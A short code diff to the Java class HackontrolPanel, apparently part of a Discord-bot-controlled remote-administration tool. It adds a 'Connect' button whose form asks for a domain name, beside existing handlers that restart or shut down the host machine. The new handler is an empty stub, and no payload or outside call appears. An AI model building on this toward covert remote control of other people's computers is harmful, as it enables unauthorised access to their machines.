@@ -7,6 +7,7 @@ import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.service.interaction.InteractionManager;
+import com.khopan.hackontrol.service.interaction.ModalManager;
 import com.khopan.hackontrol.service.interaction.StringSelectMenuManager;
 import com.khopan.hackontrol.service.interaction.context.Question;
 import com.khopan.hackontrol.service.interaction.context.Question.QuestionType;
@@ -19,6 +20,8 @@ import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.OnlineStatus;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
 
 public class HackontrolPanel extends Panel {
 	public static final String PANEL_NAME = "hackontrol";
@@ -55,7 +58,9 @@ public class HackontrolPanel extends Panel {
 			HackontrolMessage.delete(context);
 			Kernel.initiateRestart(false);
 			this.shutdownProcedure();
-		}))).addActionRow(HackontrolButton.delete()).queue(InteractionManager :: callback));
+		}))).addActionRow(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Connect", context -> context.replyModal(ModalManager.dynamicModal("Connect", modalContext -> {
+			modalContext.deferEdit().queue();
+		}).addActionRow(TextInput.create("domainName", "Domain Name", TextInputStyle.SHORT).setRequired(true).setPlaceholder("https://wwww.example.com/").build()).build()).queue()), HackontrolButton.delete()).queue(InteractionManager :: callback));
 
 		this.register(Registration.STRING_SELECT_MENU, HackontrolPanel.STRING_SELECT_STATUS, context -> {
 			this.channel.getJDA().getPresence().setStatus(DiscordStatus.fromName(context.getValues().get(0)).status);
